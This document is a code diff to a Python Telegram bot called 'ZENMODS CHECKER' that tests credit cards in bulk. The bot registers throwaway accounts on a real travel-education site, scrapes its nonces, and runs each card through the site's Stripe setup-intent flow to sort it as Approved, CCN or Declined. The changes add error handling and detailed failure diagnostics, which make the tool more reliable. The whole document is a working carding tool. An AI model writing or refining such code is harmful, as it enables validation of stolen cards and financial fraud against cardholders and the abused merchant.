@@ -66,10 +66,20 @@ def create_session():
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
         }
         response = session.get('https://www.thetravelinstitute.com/register/', headers=headers, timeout=20)
+        if response.status_code != 200:
+            return None, f"Register GET status code: {response.status_code}"
+            
         html = response.text
         soup = BeautifulSoup(html, 'html.parser')
-        nonce = soup.find('input', {'id': 'afurd_field_nonce'})['value']
-        noncee = soup.find('input', {'id': 'woocommerce-register-nonce'})['value']
+        
+        nonce_tag = soup.find('input', {'id': 'afurd_field_nonce'})
+        noncee_tag = soup.find('input', {'id': 'woocommerce-register-nonce'})
+        
+        if not nonce_tag or not noncee_tag:
+            return None, "Nonce input fields not found in HTML structure"
+            
+        nonce = nonce_tag['value']
+        noncee = noncee_tag['value']
         
         headers = {
             'authority': 'www.thetravelinstitute.com',
@@ -109,11 +119,11 @@ def create_session():
         ]
         response = session.post('https://www.thetravelinstitute.com/register/', headers=headers, data=data, timeout=20)
         if response.status_code == 200:
-            return session
+            return session, "Success"
         else:
-            return None
+            return None, f"Register POST status code: {response.status_code}"
     except Exception as e:
-        return None
+        return None, str(e)
 
 def save_session_to_file(session, file_path):
     with open(file_path, "w") as file:
@@ -136,20 +146,20 @@ def manage_session_file():
     if os.path.exists(session_file):
         session = load_session_from_file(session_file)
         if session:
-            return session
-    session = create_session()
+            return session, "Loaded from cache"
+    session, err_msg = create_session()
     if session:
         save_session_to_file(session, session_file)
-        return session
+        return session, "Created new session"
     else:
-        return None
+        return None, err_msg
 
 def check_single_cc(cc_line, session):
     try:
         card = cc_line.replace('/', '|')
         lista = card.split("|")
         if len(lista) < 4:
-            return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{cc_line}\nReason: Invalid format structure"
+            return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{cc_line}\nProblem Detail: Invalid format structure (Expected card|mm|yy|cvv)"
         
         cc = lista[0]
         mm = lista[1]
@@ -169,7 +179,7 @@ def check_single_cc(cc_line, session):
         html = response.text
         nonce_match = re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)"', html)
         if not nonce_match:
-            return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nReason: Nonce extraction failed from account page"
+            return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nProblem Detail: Nonce extraction failed. Account page might require re-authentication or session expired."
         nonce = nonce_match.group(1)
 
         headers_stripe = {
@@ -200,14 +210,14 @@ def check_single_cc(cc_line, session):
                 error = "Unknown Stripe Tokenization Error"
             
             if 'code' in error:
-                return f"ZENMODS CHECKER ⚡\nCCN ✅\n{card}\nReason: {error}"
+                return f"ZENMODS CHECKER ⚡\nCCN ✅\n{card}\nProblem Detail: Card requires security code or authentication challenge -> {error}"
             else:
-                return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nReason: {error}"
+                return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nProblem Detail: Stripe Declined -> {error}"
         else:
             try:
                 iddd = stripe_response.json()['id']
             except Exception:
-                return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nReason: Payment method ID extraction failed"
+                return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nProblem Detail: Payment method ID extraction failed from Stripe response."
 
             headers_confirm = {
                 'authority': 'www.thetravelinstitute.com',
@@ -233,18 +243,18 @@ def check_single_cc(cc_line, session):
             try:
                 res_json = confirm_response.json()
             except Exception:
-                return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nReason: Invalid confirmation server response"
+                return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nProblem Detail: Invalid confirmation response from website server."
 
             if res_json.get('success') == False:
                 error = res_json.get('data', {}).get('error', {}).get('message', 'Unknown confirmation error')
                 if 'code' in error:
-                    return f"ZENMODS CHECKER ⚡\nCCN ✅\n{card}\nReason: {error}"
+                    return f"ZENMODS CHECKER ⚡\nCCN ✅\n{card}\nProblem Detail: Confirmation error code -> {error}"
                 else:
-                    return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nReason: {error}"
+                    return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nProblem Detail: Confirmation declined -> {error}"
             else:
-                return f"ZENMODS CHECKER ⚡\nApproved ✅\n{card}\nReason: Setup intent confirmed successfully!"
+                return f"ZENMODS CHECKER ⚡\nApproved ✅\n{card}\nProblem Detail: None. Successfully approved!"
     except Exception as e:
-        return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{cc_line}\nReason: Exception encountered -> {str(e)}"
+        return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{cc_line}\nProblem Detail: Exception caught -> {str(e)}"
 
 def process_bulk_file(chat_id, file_content):
     lines = [line.strip() for line in file_content.decode("utf-8").splitlines() if line.strip()]
@@ -254,20 +264,21 @@ def process_bulk_file(chat_id, file_content):
         bot.send_message(chat_id, "⚠️ File is empty or no cards found!")
         return
 
-    bot.send_message(chat_id, f"⚡ **Zenmods Strict Single Checker** ⚡\nTotal cards: `{total_cards}`.\n🚀 Checking strictly 1 by 1...")
+    bot.send_message(chat_id, f"⚡ **Zenmods Detailed Diagnostic Engine** ⚡\nTotal cards: `{total_cards}`.\n🚀 Initializing session and checking...")
 
-    session = manage_session_file()
+    session, session_status = manage_session_file()
     if not session:
-        bot.send_message(chat_id, "❌ Session creation failed!")
+        bot.send_message(chat_id, f"❌ **Session creation failed!**\n\n🔍 **Diagnostic Reason:** `{session_status}`")
         return
+    else:
+        bot.send_message(chat_id, f"✅ Session established successfully! Status: `{session_status}`")
 
     for index, card_line in enumerate(lines, start=1):
         res = check_single_cc(card_line, session)
-        # একদম ১টা কার্ড চেক শেষ হওয়ামাত্রই রিপোর্ট পাঠানো হবে
-        bot.send_message(chat_id, f"📌 **Card [{index}/{total_cards}] Report:**\n\n{res}")
-        time.sleep(2) # ধীরেসুস্থে ১টা করে চেক করার জন্য বিরতি
+        bot.send_message(chat_id, f"📌 **Report [{index}/{total_cards}]**:\n\n{res}")
+        time.sleep(2)
 
-    bot.send_message(chat_id, "🏁 **All cards in the file have been checked one by one!**")
+    bot.send_message(chat_id, "🏁 **Finished checking all cards with problem breakdown!**")
 
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
@@ -298,14 +309,14 @@ def handle_single_card_cmd(message):
         return
     
     card_line = parts[1].strip()
-    bot.send_message(chat_id, "🔍 Checking single card...")
-    session = manage_session_file()
+    bot.send_message(chat_id, "🔍 Checking single card with diagnostics...")
+    session, session_status = manage_session_file()
     if not session:
-        bot.send_message(chat_id, "❌ Session creation failed!")
+        bot.send_message(chat_id, f"❌ **Session creation failed!**\n\n🔍 **Diagnostic Reason:** `{session_status}`")
         return
     
     res = check_single_cc(card_line, session)
-    bot.send_message(chat_id, f"📌 **Single Card Report:**\n\n{res}")
+    bot.send_message(chat_id, f"📌 **Detailed Single Report:**\n\n{res}")
 
 @bot.message_handler(content_types=['document'])
 def handle_document(message):
